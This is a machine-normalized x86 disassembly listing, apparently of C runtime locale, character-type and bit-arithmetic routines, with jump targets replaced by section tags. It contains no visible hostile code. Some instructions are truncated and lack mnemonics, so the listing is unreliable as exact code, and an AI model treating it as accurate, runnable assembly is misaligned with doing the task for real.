jmp r-xdata
call sub_43d008
add esp 0x14
pop ebp
retn
sub_43d336
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_42b774
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_439fa0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_437bec
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_43d3ee
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43d336
add esp 0xc
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax [ ebp + 0xc ]
pop ebp
retn
sub_43d42c
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_4291fb
pop ecx
pop edi
sub_43d452
mov edi edi
push ebp
mov ebp esp
push esi
call sub_426c39
mov ecx [ eax + 0x70 ]
push 0x0
pop edx
test cl 0x2
sete dl
lea esi [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
cmp edx 0xffffffff
je r-xdata
or [ rw-data ] 0xffffffff
test edx edx
je r-xdata
mov eax esi
cmp edx 0x1
je r-xdata
or ecx 0x2
cmp edx 0x2
je r-xdata
and ecx 0xfffffffd
jmp r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
or eax 0xffffffff
jmp r-xdata
mov [ eax + 0x70 ] ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_43d4d9
push 0x8
push r--data
call sub_4278c0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_427905
retn
push 0xd
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43d586
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_42578a
pop ecx
push 0xc
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_42928a
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43d592
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_42578a
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_429323
pop ecx
sub_43d5a6
push 0xc
push r--data
call sub_4278c0
call sub_426c39
mov edi eax
push 0x1
push 0x8
call sub_42acf2
pop ecx
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
test esi esi
jne r-xdata
call sub_4294bb
call sub_42b6d0
mov eax [ edi + 0x6c ]
mov [ esi ] eax
mov eax [ edi + 0x68 ]
mov [ esi + 0x4 ] eax
push 0xc
call sub_42b166
pop ecx
and [ ebp - 0x4 ] 0x0
push [ esi ]
call sub_4291fb
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43d640
push 0xd
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi + 0x4 ]
call [ InterlockedIncrement@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43d64c
mov eax esi
call sub_4268f3
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_427905
retn
sub_43d65d
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
xor ebx ebx
xor edi edi
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4296a0
int3
inc edi
cmp edi [ ebp + 0x10 ]
jl r-xdata
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_442b05
add esp 0xc
test eax eax
jne r-xdata
pop esi
sub_43d69e
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_4338e0
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_442b80
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_4376b2
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_4376b2
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_4296a0
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_442b80
test eax eax
sub_43d7bd
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_427b7a
add esp 0xc
xor ebx ebx
test eax eax
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_4296a0
int3
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43d65d
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43d65d
add esp 0x14
sub_43d828
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_42acad
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_43d65d
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4296a0
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_427fd0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_43d65d
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_42578a
pop ecx
push r--data
push ebx
push edi
call sub_442b05
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_42578a
pop ecx
push [ ebp - 0x10 ]
call sub_42578a
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_42578a
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_42578a
pop ecx
sub_43d98d
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_426c39
lea ecx [ eax + 0xc4 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0xc8 ]
lea ebx [ eax + 0xbc ]
add eax 0x14b
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_427be0
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_43d69e
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_427fd0
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_427b7a
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_443193
add esp 0xc
test eax eax
je r-xdata
xor esi esi
cmp [ ebp - 0xa4 ] esi
je r-xdata
push esi
push [ ebp - 0xa8 ]
call sub_427fd0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
test edi edi
je r-xdata
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_43d7bd
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_4247f0
add esp 0xc
mov eax [ ebp - 0xa0 ]
test eax eax
je r-xdata
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_427b7a
add esp 0xc
test eax eax
jne r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_4247f0
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
and [ eax ] 0x0
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_4376b2
add esp 0x10
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
call sub_4296a0
sub_43dbae
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_426c39
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_43d98d
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_427fd0
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_427be0
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_42acad
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_4247f0
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_427b7a
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4296a0
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_4247f0
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rw-data
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_42578a
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_437bec
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_42578a
push [ ebx + 0x54 ]
call sub_42578a
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_44489e
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_43dee8
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_43d828
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_43dbae
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_43d98d
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4247dc
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_427fd0
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_43dbae
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_445df2
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_427be0
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_442b80
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_4376b2
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_4296a0
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_43dbae
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_445ec0
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_43e104
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_42acf2
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_42acf2
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_4268f3
mov [ eax ] 0xc
push edi
push 0x220
call sub_42acf2
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_42578a
mov eax [ esi ]
mov ecx rw-data
call sub_43d42c
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
call sub_43dee8
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_42578a
push esi
call sub_42578a
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_42b877
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_42928a
push [ esi ]
call sub_429323
push esi
call sub_42578a
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_42578a
push [ esi ]
call sub_42928a
push [ esi ]
call sub_429323
push esi
call sub_42578a
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_43e204
push 0x14
push r--data
call sub_4278c0
and [ ebp - 0x20 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_426c39
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_4294bb
or [ esi + 0x70 ] 0x10
and [ ebp - 0x4 ] 0x0
xor edi edi
inc edi
push edi
push 0xd8
call sub_42acf2
pop ecx
pop ecx
mov ebx eax
mov [ ebp - 0x24 ] ebx
test ebx ebx
je r-xdata
call sub_4268f3
mov [ eax ] 0x16
call sub_42970c
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_43e373
mov eax [ ebp - 0x20 ]
push 0xc
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x6c ]
mov eax ebx
call sub_43d42c
and [ ebp - 0x4 ] 0x0
call sub_43e336
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx ebx
call sub_43dee8
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
call sub_427905
retn
push ebx
call sub_42928a
push ebx
call sub_429323
pop ecx
pop ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
push 0xc
call sub_42b166
pop ecx
mov [ ebp - 0x4 ] 0x2
lea edi [ esi + 0x6c ]
push ebx
push edi
call sub_42946e
push ebx
call sub_42928a
add esp 0xc
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_427fd0
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_43e342
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] edi
push [ edi ]
push rw-data
call sub_42946e
pop ecx
pop ecx
mov eax [ rw-data ]
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
sub_43e378
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
lea ecx [ edx + esi ]
xor eax eax
cmp ecx edx
jb r-xdata
xor eax eax
inc eax
cmp ecx esi
jae r-xdata
mov edx [ ebp + 0x10 ]
mov [ edx ] ecx
pop esi
pop ebp
retn
sub_43e39c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
mov edx [ ebp + 0xc ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
sub ecx edx
or edx 0xffffffff
shl edx cl
mov ecx [ ebp + 0x8 ]
not edx
test [ ecx + eax * 4 ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
inc eax
cmp eax 0x3
jl r-xdata
xor eax eax
pop ebp
retn
cmp [ ecx + eax * 4 ] 0x0
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_43e3e5
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
mov edx [ ebp + 0xc ]
sar eax 0x5
and edx 0x8000001f
jns r-xdata
mov edi [ ebp + 0x8 ]
sub ecx edx
xor edx edx
inc edx
shl edx cl
mov ecx [ edi + eax * 4 ]
xor ebx ebx
lea esi [ ecx + edx ]
cmp esi ecx
jb r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor ebx ebx
inc ebx
cmp esi edx
jae r-xdata
dec eax
jns r-xdata
mov [ edi + eax * 4 ] esi
jmp r-xdata
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
mov ecx [ edi + eax * 4 ]
lea edx [ ecx + 0x1 ]
xor ebx ebx
cmp edx ecx
jb r-xdata
xor ebx ebx
inc ebx
cmp edx 0x1
jae r-xdata
mov [ edi + eax * 4 ] edx
sub_43e452
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
dec edi
lea eax [ edi + 0x1 ]
cdq
and edx 0x1f
lea ebx [ edx + eax ]
lea eax [ edi + 0x1 ]
sar ebx 0x5
and eax 0x8000001f
jns r-xdata
mov esi [ ebp + 0x8 ]
push 0x1f
pop ecx
sub ecx eax
xor eax eax
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ esi + ebx * 4 ] eax
je r-xdata
dec eax
or eax 0xffffffe0
inc eax
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
push 0x3
pop ecx
and [ esi + ebx * 4 ] eax
inc ebx
cmp ebx ecx
jge r-xdata
or edx 0xffffffff
shl edx cl
mov eax ebx
not edx
test [ esi + eax * 4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
sub ecx ebx
lea edi [ esi + ebx * 4 ]
xor eax eax
[ edi ]
jne r-xdata
mov eax edi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and edi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
and [ ebp + 0xc ] 0x0
xor edx edx
sub ecx edi
inc edx
shl edx cl
mov ecx [ esi + eax * 4 ]
lea edi [ ecx + edx ]
cmp edi ecx
jb r-xdata
dec edi
or edi 0xffffffe0
inc edi
cmp [ esi + eax * 4 ] 0x0
jmp r-xdata
mov [ ebp + 0xc ] 0x1
cmp edi edx
jae r-xdata
dec eax
jns r-xdata
mov ecx [ ebp + 0xc ]
mov [ esi + eax * 4 ] edi
jmp r-xdata
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] ecx
